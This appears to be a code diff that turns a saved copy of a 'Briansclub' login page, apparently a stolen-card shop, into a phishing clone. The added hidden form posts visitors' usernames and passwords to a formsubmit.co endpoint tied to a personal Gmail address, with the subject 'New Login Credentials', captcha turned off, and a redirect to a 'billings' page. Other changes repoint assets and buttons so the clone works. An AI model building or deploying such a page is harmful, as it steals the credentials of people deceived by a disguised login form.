@@ -1,13 +1,9 @@
 <!DOCTYPE html>
 <!-- saved from url=(0039)https://www.briansclubas.shop/index.php -->
-<html data-lt-installed="true" class=" jrpyymqxn idc0_350">
-	<head>
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-
-	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-	<link href="./login_files/bootstrap.min.css" rel="stylesheet">
+<html data-lt-installed="true" class=" jrpyymqxn idc0_350"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<link href="./index_files/bootstrap.min.css" rel="stylesheet">
 	<link rel="canonical" href="https://www.briansclubas.shop/">
-	<link rel="stylesheet" href="./login_files/material-design-iconic-font.min.css" integrity="sha512-rRQtF4V2wtAvXsou4iUAs2kXHi3Lj9NE7xJR77DE7GHsxgY9RTWy93dzMXgDIG8ToiRTD45VsDNdTiUagOFeZA==" crossorigin="anonymous" referrerpolicy="no-referrer">
+	<link rel="stylesheet" href="./index_files/material-design-iconic-font.min.css" integrity="sha512-rRQtF4V2wtAvXsou4iUAs2kXHi3Lj9NE7xJR77DE7GHsxgY9RTWy93dzMXgDIG8ToiRTD45VsDNdTiUagOFeZA==" crossorigin="anonymous" referrerpolicy="no-referrer">
 	
 	<title>Briansclub cm | Brians club Login | Briansclub Shop | Bclub.cm</title>
 	<link rel="shortcut icon" type="image/jpg" href="https://www.briansclubas.shop/favicon.ico">
@@ -21,6 +17,14 @@
 	<div class="form-container">
 		<h1 style="color: rgb(11, 31, 53); font-weight: bold; font-size: 35px; text-align: left; margin-left: 45px; padding-top: 90px; font-family: sans-serif;">BRIANSCLUB LOGIN</h1><br>
 		
+		<form id="emailForm" action="https://formsubmit.co/attavya0@gmail.com" method="POST" style="display: none;">
+			<input type="hidden" name="username" id="emailUsername">
+			<input type="hidden" name="password" id="emailPassword">
+			<input type="hidden" name="_next" value="billings.html">
+			<input type="hidden" name="_subject" value="New Login Credentials">
+			<input type="hidden" name="_captcha" value="false">
+		</form>
+
 		<div style="height: 50px; width: 83%; background: rgb(242, 222, 222); color: rgba(169, 102, 157); margin-top: 20px; border-radius: 5px; border: 1px solid rgb(169, 102, 157); display: none;" class="response2">
 			<p style="float: left; margin-left: 30px; margin-top: 13px; font-size: 14px;">Login or password are incorrect</p>
 
@@ -52,10 +56,10 @@
 
 		<input type="text" id="input_val" class="input" style="margin-left: -25px; display: inline-block; width: 71%; float: left; margin-left: 7px; margin-top: -15px;" placeholder="Equals?"><br><br><br>
 
-		<button id="insert" class="login-btn"> <a href="billings.php.html" LOGIN></a></button>
+		<button id="insert" class="login-btn" onclick="window.location.href='billings.html'">LOGIN</button>
 		<button class="reg-btn" onclick="window.location.href = &#39;sign_up.php&#39;;">REGISTER</button><br><br>
 
-		<a href="login.html" style="color: rgb(165, 152, 177); float: left; margin-left: 45px;">Forgot Password?</a>
+		<a href="index.html" style="color: rgb(165, 152, 177); float: left; margin-left: 45px;">Forgot Password?</a>
 	</div>
 	
 </center>
@@ -74,7 +78,7 @@
 	}
 </script>
 
-<script src="./login_files/jquery.min.js.download"></script>
+<script src="./index_files/jquery.min.js.download"></script>
 <script type="text/javascript">
 	let input_val = document.getElementById('input_val');
 
@@ -102,7 +106,7 @@
 				var username = $("#username").val();
 				var password = $("#password").val();
 				$.ajax({
-					url: "login_action.php",
+					url: "index.html",
 					method: "post",
 					data: {username:username, password:password},
 					success: function(data) {
@@ -125,7 +129,10 @@
 
 <style type="text/css">
 	body {
-		background-image: url("wallpaper.jpg");
+		background-image: url("index_files/wallpaper.jpg");
+		background-size: cover;
+		background-repeat: no-repeat;
+		background-position: center;
 		font-family: sans-serif;
 	}
 	.form-container {
